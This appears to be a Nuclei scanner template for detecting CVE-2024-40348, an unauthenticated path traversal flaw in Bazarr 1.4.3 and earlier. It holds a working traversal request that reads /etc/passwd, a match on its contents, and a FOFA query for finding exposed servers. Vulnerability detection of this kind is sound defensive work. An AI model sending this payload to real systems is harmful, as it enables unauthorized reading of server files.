flow: http(1) && http(2)
http:
- matchers:
  - condition: or
    internal: true
    part: body
    type: word
    words:
    - <title>Bazarr</title>
    - content="Bazarr
    - window.Bazarr
  method: GET
  path:
  - '{{BaseURL}}/login'
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - part: header
    type: word
    words:
    - application/octet-stream
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/api/swaggerui/static/../../../../../../../../../../../../../../../../etc/passwd'
id: CVE-2024-40348
info:
  author: s4e-io
  classification:
    epss-percentile: 0.99724
    epss-score: 0.92526
  description: 'Bazarr 1.4.3 and earlier versions have a arbitrary file read vulnerability.

    '
  impact: 'Unauthenticated attackers can read arbitrary files from the Bazarr server
    via path traversal.

    '
  metadata:
    fofa-query: title=="Bazarr" && icon_hash="-1983413099"
    max-request: 2
    product: bazarr
    vendor: morpheus65535
    verified: true
  name: Bazarr < 1.4.3 - Arbitrary File Read
  reference:
  - https://github.com/4rdr/proofs/blob/main/info/Bazaar_1.4.3_File_Traversal_via_Filename.md
  - https://www.bazarr.media/
  - https://github.com/bigb0x/CVE-2024-40348
  remediation: 'Update Bazarr to version 1.4.4 or later.

    '
  severity: high
  tags: cve,cve2024,bazarr,lfi,vuln
